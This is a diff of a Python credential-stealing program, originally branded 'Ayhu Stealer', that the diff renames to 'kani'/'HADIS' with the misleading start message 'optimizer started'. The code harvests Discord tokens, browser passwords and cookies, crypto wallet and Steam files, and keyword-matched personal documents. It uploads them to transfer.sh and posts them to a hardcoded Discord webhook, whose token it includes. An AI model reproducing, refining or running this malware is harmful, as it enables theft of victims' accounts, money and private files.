@@ -16,21 +16,21 @@ import random
 import subprocess
 
 
-# ===================== CONFIG =====================
-DEBUG = True        # False = silent, True = print every skipped line
-VERBOSE = True      # False = no [ayhu] progress trace
-PAUSE = True        # keep console open at the end (set False in a debugger)
-USE_TRUST_FACTOR = False   # True = skip zip/kiwi when google cookies exist
-# ==================================================
+
+DEBUG = True        
+VERBOSE = True      
+PAUSE = True       
+USE_TRUST_FACTOR = False   
 
 
-# ===================== SAFETY NET =====================
+
+
 ERRS = []
 
 
 def say(msg):
     if VERBOSE:
-        print(f"[ayhu] {msg}", flush=True)
+        print(f"[kani] {msg}", flush=True)
 
 
 def _log(label, e):
@@ -68,11 +68,11 @@ def safe(label, fn, *a, **kw):
     except Exception as e:
         _log(label, e)
         return None
-# ======================================================
+
 
 
 #  KANI
-#
+
 
 hook = "https://discord.com/api/webhooks/1562590406414172222/Y4V3VqSIAhglMWBCaY-Ziqg4YcxWQXo0QkhG_TkTXvvtvC--S8MQDtkFiPcIN88BXW2D"
 DETECTED = False
@@ -86,7 +86,7 @@ def getip():
     return ip
 
 
-# ---------- dependencies ----------
+
 requirements = [
     ["requests", "requests"],
     ["Crypto.Cipher", "pycryptodome"]
@@ -170,7 +170,7 @@ def DecryptValue(buff, master_key=None):
 def LoadRequests(methode, url, data='', files='', headers=''):
     if requests is None:
         return None
-    for i in range(8):  # max trys
+    for i in range(8):  
         try:
             if methode == 'POST':
                 if data != '':
@@ -203,13 +203,13 @@ def LoadUrlib(hook, data='', files='', headers=''):
 
 @step
 def Trust(Cookies):
-    # simple Trust Factor system
+    
     global DETECTED
     if not USE_TRUST_FACTOR:
-        DETECTED = False          # matches the old (always-False) behaviour
+        DETECTED = False          
         return DETECTED
     tim = re.findall(r"\.google\.com", str(Cookies))
-    DETECTED = len(tim) > 0        # was `len(tim) < -1` -> never True
+    DETECTED = len(tim) > 0        
     return DETECTED
 
 
@@ -353,13 +353,13 @@ def uploadToken(token, path):
                     {"name": ":credit_card: Billing:", "value": f"{billing}", "inline": True}
                 ],
                 "author": {"name": f"{username}#{hashtag} ({idd})", "icon_url": f"{pfp}"},
-                "footer": {"text": "@Ayhu Stealer",
+                "footer": {"text": "@hadis",
                            "icon_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg"},
                 "thumbnail": {"url": f"{pfp}"}
             }
         ],
         "avatar_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg",
-        "username": "Ayhu Stealer",
+        "username": "@kani",
         "attachments": []
     }
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -391,8 +391,8 @@ def upload(name, tk=''):
                 {
                     "color": 14406413,
                     "fields": [{"name": "Interesting files found on user PC:", "value": tk or "-"}],
-                    "author": {"name": "Ayhu | File Stealer"},
-                    "footer": {"text": "@Ayhu Stealer",
+                    "author": {"name": "HADIS"},
+                    "footer": {"text": "@kani",
                                "icon_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg"}
                 }
             ],
@@ -404,8 +404,7 @@ def upload(name, tk=''):
 
     path = name
 
-    # FIX: read into memory and close the handle immediately,
-    # otherwise the file stays locked and os.remove() of the zip fails on Windows
+
     raw = None
     with skip("read file for upload"):
         with open(path, 'rb') as fh:
@@ -463,16 +462,16 @@ def upload(name, tk=''):
 
 @step
 def writeforfile(data, name):
-    path = os.getenv("TEMP") + rf"\wp{name}.txt"          # FIX: raw string
+    path = os.getenv("TEMP") + rf"\wp{name}.txt"          
     with open(path, mode='w', encoding='utf-8') as f:
         f.write(f"<--HADIS BEST-->\n\n")
         for line in data:
-            if line:                                       # FIX: line[0] blew up on empty
+            if line:                                       
                 with skip("write line"):
                     f.write(f"{line}\n")
 
 
-Tokens = set()                                             # FIX: was a string
+Tokens = set()                                            
 
 
 @step
@@ -483,7 +482,7 @@ def getToken(path, arg):
     path += arg
     for file in os.listdir(path):
         if file.endswith(".log") or file.endswith(".ldb"):
-            lines = []                                     # FIX: was unbound on read error
+            lines = []                                     
             with skip(f"read {file}"):
                 lines = [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]
             for line in lines:
@@ -517,7 +516,7 @@ def getPassw(path, arg):
         shutil.copy2(pathC, tempfold)
 
     conn = cursor = None
-    data = None                                            # FIX: was unbound on sql error
+    data = None                                           
     with skip("read Login Data"):
         conn = sql_connect(tempfold)
         cursor = conn.cursor()
@@ -577,7 +576,7 @@ def getCookie(path, arg):
         shutil.copy2(pathC, tempfold)
 
     conn = cursor = None
-    data = None                                            # FIX: was unbound on sql error
+    data = None                                           
     with skip("read Cookies"):
         conn = sql_connect(tempfold)
         cursor = conn.cursor()
@@ -634,7 +633,7 @@ def GetDiscord(path, arg):
 
     for file in os.listdir(pathC):
         if file.endswith(".log") or file.endswith(".ldb"):
-            lines = []                                     # FIX: was unbound on read error
+            lines = []                                    
             with skip(f"read {file}"):
                 lines = [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]
             for line in lines:
@@ -663,7 +662,7 @@ def ZipThings(path, arg, procc):
 
     with skip(f"taskkill {procc}"):
         subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
-        time.sleep(0.6)          # give the browser a moment to release the files
+        time.sleep(0.6)          
 
     if "Wallet" in arg or "NationsGlory" in arg:
         with skip("wallet name"):
@@ -686,7 +685,7 @@ def ZipThings(path, arg, procc):
 
     ok = False
     with skip("zip create"):
-        with ZipFile(f"{pathC}/{name}.zip", "w") as zf:   # FIX: context manager closes it
+        with ZipFile(f"{pathC}/{name}.zip", "w") as zf:   
             for file in os.listdir(pathC):
                 if ".zip" not in file:
                     with skip(f"zip add {file}"):
@@ -727,7 +726,7 @@ def GatherAll():
     PathsToZip = [
         [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
         [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
-        [r"C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],   # FIX: raw string
+        [r"C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],   
         [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"]
     ]
 
@@ -784,7 +783,7 @@ def GatherAll():
 @step
 def uploadToAnonfiles(path):
     try:
-        with open(path, mode='rb') as fh:                  # FIX: handle was left open
+        with open(path, mode='rb') as fh:                  
             files = {"file": (os.path.basename(path), fh.read())}
         up = requests.post("https://transfer.sh/", files=files)
         return up.text
@@ -801,13 +800,13 @@ def KiwiFolder(pathF, keywords):
     global KiwiFiles
     maxfilesperdir = 7
     i = 0
-    listOfFile = []                                        # FIX: was unbound on listdir error
+    listOfFile = []                                        
     with skip("list dir"):
         listOfFile = os.listdir(pathF)
     ffound = []
     for file in listOfFile:
         if not os.path.isfile(pathF + "/" + file):
-            continue                      # was 'return' -> bug, skipped whole folder
+            continue                     
         i += 1
         if i <= maxfilesperdir:
             url = uploadToAnonfiles(pathF + "/" + file)
@@ -821,7 +820,7 @@ def KiwiFolder(pathF, keywords):
 def KiwiFile(path, keywords):
     global KiwiFiles
     fifound = []
-    listOfFile = []                                        # FIX: was unbound on listdir error
+    listOfFile = []                                       
     with skip("list dir"):
         listOfFile = os.listdir(path)
     for file in listOfFile:
@@ -840,7 +839,7 @@ def KiwiFile(path, keywords):
 
 @step
 def Kiwi():
-    user = temp.split(r"\AppData")[0]                      # FIX: raw string
+    user = temp.split(r"\AppData")[0]                      
     path2search = [
         user + "/Desktop",
         user + "/Downloads",
@@ -886,7 +885,7 @@ cookiWords = []
 paswWords = []
 
 
-# ===================== MAIN =====================
+
 @step
 def main():
     GatherAll()
@@ -916,7 +915,7 @@ def main():
 
 
 if __name__ == "__main__":
-    say("Ayhu stealer started")
+    say("optimizer started")
     try:
         main()
     except Exception as e:
